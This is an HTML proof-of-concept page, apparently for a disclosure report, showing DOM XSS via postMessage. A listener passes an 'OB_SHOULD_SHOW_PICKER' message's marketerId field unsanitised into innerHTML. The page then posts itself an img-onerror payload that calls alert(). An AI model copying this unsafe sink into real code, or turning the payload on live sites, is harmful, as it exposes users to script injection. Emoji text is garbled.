<!DOCTYPE html>
<html>
  <head>
    <title>ðŸ”¥ XSS PoC - thebrowser.company</title>
    <style>
      body {
        font-family: sans-serif;
        background: #f0f0f0;
        padding: 30px;
      }
      #output {
        background: white;
        padding: 20px;
        border: 2px solid #888;
        margin-top: 20px;
      }
    </style>
  </head>
  <body>
    <h1>âœ… DOM XSS PoC via postMessage</h1>
    <p>Payload will be sent automatically, and injected here:</p>

    <div id="output">[ Waiting for message... ]</div>

    <script>
      // Step 1: Listen for postMessage
      window.addEventListener("message", (event) => {
        if (event.data?.message === "OB_SHOULD_SHOW_PICKER") {
          const html = event.data.content?.marketerId?.[0];
          if (html) {
            console.log("ðŸ“¥ Received marketerId:", html);
            document.getElementById("output").innerHTML = html;
          }
        }
      });

      // Step 2: Auto-send payload after 1 second
      window.onload = () => {
        setTimeout(() => {
          console.log("ðŸš€ Sending XSS payload via postMessage...");
          window.postMessage({
            message: "OB_SHOULD_SHOW_PICKER",
            content: {
              marketerId: [
                `<img src=x onerror="alert('ðŸ”¥ XSS Executed in PoC')">`
              ]
            }
          }, "*");
        }, 1000);
      };
    </script>
  </body>
</html>
